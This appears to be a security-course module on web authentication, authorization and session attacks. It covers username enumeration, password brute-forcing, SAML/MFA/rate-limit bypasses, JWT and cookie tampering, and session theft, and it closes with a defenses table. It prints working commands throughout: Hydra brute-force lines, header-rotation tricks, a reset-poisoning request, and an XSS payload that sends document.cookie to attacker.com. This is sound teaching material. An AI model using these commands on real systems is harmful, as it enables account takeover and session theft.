# 06 — Session, Authentication & Authorization Attacks

> Three closely related but distinct trust boundaries: **authentication** (proving who you are), **authorization** (what you're allowed to do once you're in), and **session management** (staying "logged in" across many stateless HTTP requests). Each has its own attack surface, and a weakness in any one of them can undermine the other two.
>
> For the deepest possible coverage of session hijacking mechanics (packet-level TCP/session prediction, tools like Burp/Ettercap/Bettercap for full session takeover), see the companion **Module 11: Session Hijacking** repository — this file focuses on the web-application-specific angle.

## Table of Contents
- [Attacking the Authentication Mechanism](#attacking-the-authentication-mechanism)
- [Bypassing Authentication](#bypassing-authentication)
- [Attacking Authorization Schemes](#attacking-authorization-schemes)
- [Attacking Access Controls](#attacking-access-controls)
- [Attacking Session Management](#attacking-session-management)
- [Cookie & Session-Specific Attacks](#cookie--session-specific-attacks)
- [Defenses](#defenses)

---

## Attacking the Authentication Mechanism

### Username Enumeration
**Root cause:** the application's responses differ subtly depending on whether a supplied username exists, letting an attacker build a list of valid accounts before even attempting password guesses.

Tell-tale signs to check for:
- Different error messages: `"Invalid username"` vs `"Invalid password"`.
- Different HTTP status codes or response timing (an existing-user check against a hashed password takes measurably longer than a non-existent-user short-circuit).
- Different behavior at "forgot password" ("If this email exists, we've sent a reset link" is *good* — a difference like "We don't have an account with that email" is a leak).

```bash
# Manual enumeration with curl, comparing response length/timing across candidate usernames
for user in admin administrator test guest; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} %{time_total} $user\n" \
    -d "username=$user&password=wrongpassword" https://target.com/login
done
```

### Password Attacks: Brute-Forcing

```bash
# Hydra against an HTTP POST login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Hydra against HTTP Basic Auth
hydra -L users.txt -P passwords.txt target.com http-get /admin/

# Burp Suite Intruder equivalent (GUI): send the login request to Intruder,
# mark the password field as the payload position, load a wordlist, and
# use the "Grep - Match" setting on the failure string to filter results.
```

### Password Functionality Exploits
- **Bad passwords accepted** — no complexity policy, so users choose `password123`.
- **Verbose failure messages** during password change/reset (revealing whether an old password matched, or which validation rule failed) that assist guessing.
- **Password stored/transmitted insecurely** (found via source review or by testing whether the password is reversible from a "remember me" token).

### Attacking the Password-Reset Mechanism
Common weaknesses:
- **Predictable reset tokens** (sequential IDs, timestamp-derived, or otherwise low-entropy) — brute-forceable.
- **Token doesn't expire** or isn't invalidated after first use.
- **Host header injection into the reset link** — if the app builds the reset URL from the `Host` header instead of a fixed value, an attacker can poison the reset email to point at an attacker-controlled domain:
```
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
If the app generates `https://attacker.com/reset?token=...` in the email using the spoofed `Host` header, the victim's click sends their valid reset token straight to the attacker's server.

## Bypassing Authentication

### Bypass SAML-Based SSO
Attackers exploit **signature validation misconfigurations** in SAML SSO. Common techniques:
- **XML Signature Wrapping (XSW)** — inserting a forged assertion alongside the original signed one, hoping the service provider validates the signature against the *original* assertion but then processes the *forged* one for the actual logic.
- **Signature stripping** — removing the signature entirely and testing whether the service provider still accepts the (now-unsigned) assertion.
- **Session replay** — replaying a captured, still-valid SAML assertion.

```
# In Burp Suite, capture the SAML response (a Base64-encoded XML blob in the POST body),
# decode it, modify the <NameID> or attribute values (e.g., to impersonate an admin user),
# then re-encode and forward — testing whether the receiving service actually re-validates
# the signature against the tampered content.
```

### Bypass Rate Limiting
Rate limits are frequently keyed on a single dimension that an attacker can rotate:
```bash
# Rotate the X-Forwarded-For header per request to defeat IP-based rate limiting
curl -H "X-Forwarded-For: 1.2.3.$((RANDOM % 255))" -d "username=admin&password=guess$i" https://target.com/login

# Try alternate casing/whitespace/encoding on the endpoint path, since some rate limiters
# are applied per exact-path-string rather than per logical-endpoint
curl -d "..." https://target.com/Login    # capital L
curl -d "..." https://target.com/login/   # trailing slash
curl -d "..." https://target.com/login%20 # trailing encoded space
```

### Bypass Multi-Factor Authentication (MFA)
- **Response manipulation** — intercepting the MFA verification response in Burp and changing `"success": false` to `"success": true` (works only if the client trusts this flag without server-side session state also being updated — surprisingly common).
- **OTP brute-force** — if the OTP is only 4–6 digits and there's no rate limiting on the verification endpoint, brute-forcing is feasible within a token's validity window.
- **Missing MFA enforcement on alternate login paths** — e.g., MFA is enforced on the web UI but not on a legacy API endpoint or mobile-app login flow that reaches the same account.
- **Session-fixation-style bypass** — completing step 1 (password) for the *victim's* account, then reusing that partially-authenticated session token/state without ever completing step 2, if the server doesn't strictly gate step 2 access.

### Design and Implementation Flaws in Authentication
- Client-side-only validation of login fields.
- "Remember me" tokens that are just a lightly obfuscated (not signed/HMAC'd) username, forgeable by anyone who studies the encoding scheme.
- Inconsistent authentication enforcement across different subdomains/microservices behind the same reverse proxy.

## Attacking Authorization Schemes

### HTTP Request Tampering
Modifying HTTP request elements (method, headers, or body) that the server implicitly trusts for authorization decisions.
```
# Changing the HTTP method can sometimes bypass a WAF rule or route to unauthenticated logic
POST /admin/deleteUser HTTP/1.1     →     GET /admin/deleteUser?id=5 HTTP/1.1
```

### Parameter Tampering
```
# Changing a role/price/quantity parameter the client should never be trusted to set
POST /checkout HTTP/1.1
...
productId=1001&price=999.99      →      productId=1001&price=0.01
```

### Cookie Parameter Tampering
```
Cookie: role=user      →      Cookie: role=admin
Cookie: isAdmin=false  →      Cookie: isAdmin=true
```
Any authorization-relevant flag stored client-side in a cookie (or in a JWT claim that isn't properly signature-verified) is trivially editable by the client that owns it.

## Attacking Access Controls

| Access control type | What it checks | How it's attacked |
|---|---|---|
| **Parameter-based** | An ID/role value in the request | Modify the ID/role directly ([IDOR](./02-owasp-top-10-and-web-threats.md#a01-broken-access-control)) |
| **Role-based (RBAC)** | User's assigned role vs. required role for the action | Escalate role via parameter/cookie/JWT tampering; find endpoints that forgot to check role at all |
| **Location-based** | Source IP/geolocation | Spoof headers (`X-Forwarded-For`), route through a VPN/proxy in an allowed region |

**JWT-specific access-control attacks** (when JWTs carry authorization claims):
```bash
# Check if the server accepts the "none" algorithm (dangerous legacy misconfiguration)
# Decode header/payload, set "alg":"none", strip the signature, resubmit

# Check if the server verifies signature at all by tampering with a claim and resending
# without recalculating the signature
```

## Attacking Session Management

### Session Token Generation Attacks
- **Session Token Prediction** — if tokens are generated from a predictable seed (timestamp, sequential counter, weak PRNG), an attacker can predict a valid token for another user without ever stealing one.
- **Session Token Tampering** — modifying a token that encodes data directly (rather than being a random opaque reference) if that data isn't integrity-protected.

### Session Token Handling Attacks
- **Man-in-the-Middle (MITM)** — intercepting a session token in transit over an unencrypted or improperly-validated TLS channel.
- **Session Replay** — capturing a valid token and reusing it later, if the server doesn't bind the token to any additional context (originating IP, User-Agent) or enforce short expiry.
- **Session Hijacking** — full takeover of an authenticated session using a stolen token. *(Full technical coverage — network-level sniffing, cross-site scripting-to-session-theft chains, and tool walkthroughs for Ettercap/Bettercap/Burp — lives in the Module 11: Session Hijacking repository.)*

### Session Token Sniffing
```bash
# Wireshark filter to isolate HTTP requests carrying a Cookie header on an unencrypted connection
http.cookie

# Once captured, replay the cookie value directly in a new request
curl -H "Cookie: sessionid=<captured_value>" https://target.com/account
```

### Manipulating WebSocket Traffic
Using Burp Suite's **Proxy → WebSockets history** tab (or `mitmproxy`), intercept and modify WebSocket frames in-flight — useful for testing whether server-side authorization is actually re-checked per message, or only once at connection time.

## Cookie & Session-Specific Attacks

### Cookie/Session Poisoning
Modifying the contents of a cookie to escalate privilege, extend a session beyond its intended lifetime, or impersonate another user — e.g., changing a `userId` cookie value, or re-signing a tampered cookie if the signing key was discovered elsewhere (leaked source code, weak/default key).

### Cookie Snooping
Passive interception of cookies as they traverse the network — trivial on unencrypted HTTP or on a shared/open Wi-Fi network without the `Secure` cookie flag enforced. Tools: Wireshark, `tcpdump`, or any ARP-spoofing MITM setup on a local segment.

### Pass-the-Cookie Attack
Rather than cracking or predicting a session, the attacker directly copies a **stolen authentication cookie** (exfiltrated via malware, an XSS payload, or a synced/leaked browser profile) into their own browser and is instantly logged in as the victim — no password needed at all. This is functionally identical to "pass-the-hash" in Windows authentication, applied to web sessions.
```javascript
// Cookie exfiltration payload, often chained after a successful XSS
document.location='https://attacker.com/steal?c='+document.cookie;
```

### Same-Site Attack
Exploits a **dangling subdomain** that shares a parent domain (and therefore a cookie scope, if cookies aren't scoped tightly) with the legitimate site. If `forgotten.target.com` still resolves (via a stale CNAME) to infrastructure the attacker now controls, the attacker's subdomain can read/set cookies scoped to `.target.com`, redirecting users away from the legitimate site or harvesting shared-scope cookies.

### RC4 NOMORE Attack
A cryptographic attack against the **RC4 stream cipher** (historically used in some TLS cipher suites and in WEP). "NOMORE" (Numerous Occurrence MOnitoring & Recovery Exploit) exploits statistical biases in RC4's keystream: by observing enough ciphertext of the *same* plaintext (e.g., a session cookie sent repeatedly over many TLS connections using RC4), an attacker can statistically recover the plaintext without ever obtaining the key. Modern relevance is now mostly historical/compliance-driven — the practical defense is simply **disabling RC4 entirely** in server TLS configuration, which virtually every current guidance already mandates.

## Defenses

| Attack | Primary Defense |
|---|---|
| Username Enumeration | Identical response messages/timing regardless of account existence |
| Password Brute-Forcing | Account lockout / exponential backoff, CAPTCHA after N failures, MFA |
| Password Reset Abuse | High-entropy, single-use, short-lived tokens; never derive reset links from the `Host` header |
| SAML/SSO Bypass | Strict, complete signature validation of the *entire* assertion (not just a sub-element); reject unsigned assertions |
| Rate-Limit Bypass | Key rate limits on authenticated identity where possible, not solely on IP; normalize paths before rate-limit matching |
| MFA Bypass | Enforce MFA state server-side across every login path; never trust a client-supplied "verified" flag |
| Parameter/Cookie Tampering | Never trust client-supplied authorization data; re-derive role/permissions server-side on every request |
| Session Prediction | Use a cryptographically secure random token generator (CSPRNG), sufficient length (≥128 bits of entropy) |
| Session Hijacking / Replay | `Secure` + `HttpOnly` + `SameSite` cookies, TLS everywhere, short session lifetimes, bind sessions to additional signals where feasible |
| Cookie/Session Poisoning | Sign and encrypt session data server-side; never trust client-editable session state |
| Pass-the-Cookie | Short-lived tokens, IP/device-binding heuristics, immediate revocation on suspicious activity |
| Same-Site (dangling subdomain) | Regularly audit DNS records for stale CNAMEs pointing at decommissioned cloud resources |
| RC4 NOMORE | Disable RC4 cipher suites entirely; enforce TLS 1.2+ with modern AEAD ciphers |

---

**Previous:** [← 05 — XSS, CSRF & Client-Side Attacks](./05-xss-csrf-and-client-side-attacks.md) · **Next:** [07 — Web Services, API & Webhook Attacks →](./07-web-services-api-and-webhook-attacks.md)
